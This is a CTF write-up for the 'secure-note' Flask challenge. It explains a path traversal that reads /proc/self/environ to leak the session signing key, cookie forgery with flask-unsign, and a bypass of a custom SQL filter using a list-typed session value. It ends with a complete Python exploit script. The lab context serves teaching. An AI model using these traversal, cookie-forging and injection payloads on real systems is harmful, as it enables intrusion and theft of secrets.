# secure-note

# Overview

This site simply allows users to take notes and review the notes that have been written.

![User taking note](secure-note%2090d2fa040eff448a85b2e3a7ab4627d0/Untitled.png)

User taking note

![List notes of an user](secure-note%2090d2fa040eff448a85b2e3a7ab4627d0/Untitled%201.png)

List notes of an user

# Features of the site

After walking around the site, we can list its features as follows:

- Register an account at `/register`
- Login at `/login`
- Logout at `/logout`
- List all notes of current user at `/notes`
- Write new note at `/write_note`
- Read a note at `/read_note`

# Find entry points

After having an overview of the site and its features. We need to figure out which inputs we can control. Here are some obvious inputs:

- `Username`, `Password` and `Secret Key` at `/register`
- `Username`, `Password` at `/login`
- `Title`, `Content` at `/write_note`
- `filename` GET parameter at `/read_note`

# Read the source code

In this article, we are provided with a part of the source code. Includes 2 files:

- `app.py`: Contains the handlers of each route on the site
- `setup_flag.py`: Indicates how the flag is set on the server

After reading the contents of these two files, we understand the following points:

- Server written in Flask
- Each user will manually select a `Secret Key` when registering for an account. `Secret Key` is a string of 32 characters, each of which ranges from `a` to `f` or `0` to `9`.
- Each user's note will be encrypted with that person's `Secret Key` to ensure that the note cannot be read by others even if the note has been leaked.
- The encrypted user's notes are saved as a separate text file on the server in the `notes` folder, located at the same level as the `app.py` file.
- The flag is in the user's note with the username `admin`

# **Identify the vulnerability**

Observe the `/read_note` route for the user to read one of their notes:

![Untitled](secure-note%2090d2fa040eff448a85b2e3a7ab4627d0/Untitled%202.png)

This route takes a parameter `filename` which is the name of the note to read. The system will then read the contents of the file `filename` in the `notes` folder and save it in the `content` variable.

The system will then decrypt the `content` variable with the user's `Secret Key`. If decryption is successful, the `content` variable will be updated.

Here we see 2 problems:

- We can read an arbitrary file on the server by changing the value of `filename`, for example if `filename` is `../app.py` then we can read the contents of the file `app.py`
- When decoding the `content` variable, if an error occurs, such as a wrong `Secret Key`, the value of the variable `content` remains unchanged, meaning that `content` is now the content of the file that has been read.

From these two things, we can read an arbitrary file on the server. So we will use it to read the remaining files in the source code `utils/crypto.py` and `utils/security.py`.

The file `utils/crypto.py` contains the algorithm used to encrypt and decrypt the contents of the notes.  This is the AES algorithm in GCM mode.

![Untitled](secure-note%2090d2fa040eff448a85b2e3a7ab4627d0/Untitled%203.png)

The file `utils/security.py` contains only the function `waf_filter`. This function will remove the characters commonly used for SQL Injection attacks. 

![Untitled](secure-note%2090d2fa040eff448a85b2e3a7ab4627d0/Untitled%204.png)

This function is called every time the server manipulates the database. For example, when a user creates a new note.

![Untitled](secure-note%2090d2fa040eff448a85b2e3a7ab4627d0/Untitled%205.png)

This function filters very carefully so we can hardly perform SQL Injection attack.

Think about it, what other files can we take advantage of this error to read? Take a look at the file `app.py`.

![Untitled](secure-note%2090d2fa040eff448a85b2e3a7ab4627d0/Untitled%206.png)

The website's `secret_key` is obtained from an environment variable named `SECRET_KEY`. In Flask, session information is stored in cookies on the user's machine. Therefore, it is necessary to sign the cookie with `secret_key` to ensure that the information in the cookie cannot be changed by the user.

So what if we know this `secret_key` value? We can fake an arbitrary cookie, of any user. In Linux, the value of the environment variable is stored in the file `/proc/self/environ`. So reading this file helps us to know the value of the variable `SECRET_KEY`.

![Untitled](secure-note%2090d2fa040eff448a85b2e3a7ab4627d0/Untitled%207.png)

Now you have the `secret_key`, so you can create a cookie of the user `admin` and read the user's notes and get the flag.

# However, things are not that simple …

Now you can forge `admin` cookies but still not be able to read his notes. To explain this, let's look again at how the note decodes when calling `/read_note`

![Untitled](secure-note%2090d2fa040eff448a85b2e3a7ab4627d0/Untitled%208.png)

The `secret_key` value passed to the decryption function is obtained from the session, not from the database. Therefore, if you do not know the `secret_key` of `admin`, there is no way to fake the correct session `secrey_key`.

Everything seems to have come to a standstill …

But think again, why did the author use the `waf_filter` function, a self-written function for the values in the SQL query, instead of using Prepared Parameter, a safe solution against SQL Injection? This function blocks a lot of things to be able to attack SQL Injection. However, is it really safe?

# Bypass `waf_filter`

We will find a way to bypass this function. First we need to see what variables are passed to this function. After reading the source for a while, I was able to list them out:

- `username`, `password` from input at route`/login`, `/register`
- `secret_key` from input at route`/register`
- `session['username']`
- `title`, `content` from input at route `/write_note`

Take a look at the list above, what's unusual? The values all come from HTML forms, only `session['username']` comes from session, a value that we can control as we wish.

Reading this far you will probably ask: "The rest of the values are taken from the HTML form, so we can control them too?".

You are right, but we have more control in the session variable. That is the data type. Values from form are of type `str`, while session variables can be of type `int`, `dict`, `str`, `list`, …

Let observe the SQL query that uses `session['username']`.

![Untitled](secure-note%2090d2fa040eff448a85b2e3a7ab4627d0/Untitled%209.png)

What if `session['username']` has type `list` and contains characters that are forbidden in the `waf_filter` function, such as `session['username'] = ['abc', '##']` contains character `#`? The `waf_filter` function will not filter out any values in `session['username']` because when it checks that `#` in `session['username']`, the result will always be wrong.

But more importantly, how would `session['username']` then be concatenated into the SQL query? Let's do a little experiment!

![Untitled](secure-note%2090d2fa040eff448a85b2e3a7ab4627d0/Untitled%2010.png)

Our SQL query now contains the forbidden character `#` and is not filtered by the `waf_filter` function.

What really happen? Notice that the `f` character is preceded by the query, which means this is Literal String Interpolation in Python. You can read about it here [https://peps.python.org/pep-0498/](https://peps.python.org/pep-0498/). It will replace the value `{session['username']}` with the value `str(session['username'])`, when calling `str()` on type `list` the elements in `list` will be concatenated into a string. So we have the above result.

![Untitled](secure-note%2090d2fa040eff448a85b2e3a7ab4627d0/Untitled%2011.png)

So now you can bypass `waf_filter` and perform SQL Injection comfortably. You can use SQL Injection to create a new account with the `secret_key` copied from the `admin` account. Then log in to this account to get the `secret_key` of `admin` and read the flag.

# Exploit code

```python
import requests
import secrets
import os
import hashlib
import re
import time

URL = 'http://127.0.0.1:8000'
ACCOUNT = 'admin'

s = requests.Session()

def random_user():
    return {
        'username': secrets.token_hex(5),
        'password': secrets.token_hex(50),
        'secretkey': 'a'*32
    }

def register(user):
    time.sleep(1)
    s.post(URL + '/register', data={
        'username': user['username'],
        'password': user['password'],
        'repassword': user['password'],
        'secretkey': user['secretkey'],
    })

def login(user):
    time.sleep(1)
    s.post(URL + '/login', data={
        'username': user['username'],
        'password': user['password'],
    })

def logout():
    time.sleep(1)
    s.get(URL + '/logout')

def read_file(filename):
    time.sleep(1)
    return s.get(URL + '/read_note?filename=' + filename).text

def get_session_key():
    user = random_user()
    register(user)
    login(user)
    content = read_file('../../proc/self/environ')
    return re.findall(r'SECRET_KEY=(.*)\x00HOME=/root', content)[0] # you need to print content and modify this regex 

def get_user_note_list(username, session_key):
    time.sleep(1)
    payload = {
        'username': username,
        'secret_key': '0123456789ABCDEF'
    }
    payload = str(payload).replace('"', '\\"')
    session = os.popen(f"flask-unsign --sign --cookie \"{payload}\" --secret '{session_key}'").read()[:-1]
    resp = requests.get(URL + '/notes', cookies={'session': session}).text
    return re.findall(r'\/read_note\?filename=(.*)\" class=\"btn btn-primary\">', resp)

def copy_user_secret_key(username, session_key):
    time.sleep(1)
    user = random_user()
    md5_password = hashlib.md5(user['password'].encode()).hexdigest()
    payload = {
        'username': ['\'; insert into users(username, password, secret_key) values (\'' + user['username'] + '\', \'' + md5_password + '\', (select k from (select secret_key as k from users where username=\'' + username + '\') a))-- '],
        'secret_key': '0123456789ABCDEF'
    }
    payload = str(payload).replace('"', '\\"')
    session = os.popen(f"flask-unsign --sign --cookie \"{payload}\" --secret '{session_key}'").read()[:-1]
    requests.get(URL + '/notes', cookies={'session': session})
    return user

def test(session_key):
    time.sleep(1)
    payload = {
        'username': 'admin',
        'secret_key': 'cascascas'
    }
    payload = str(payload).replace('"', '\\"')
    session = os.popen(f"flask-unsign --sign --cookie \"{payload}\" --secret '{session_key}'").read()[:-1]
    return session

session_key = get_session_key()
print(f'[+] session_key = {session_key}')

note_list = get_user_note_list(ACCOUNT, session_key)
print(f'[+] note_list = {note_list}')

fake_user = copy_user_secret_key(ACCOUNT, session_key)
print('[+] fake user with same secret key created')

logout()
login(fake_user)
print('[+] login as fake_user')

print('[+] finding flag')
for note in note_list:
    content = read_file(note)
    re_res = re.findall(r'HCMUS-CTF{(.*)}', content)
    if len(re_res) > 0:
        for flag in re_res:
            print("[+] flag: HCMUS-CTF{" + flag + "}")
```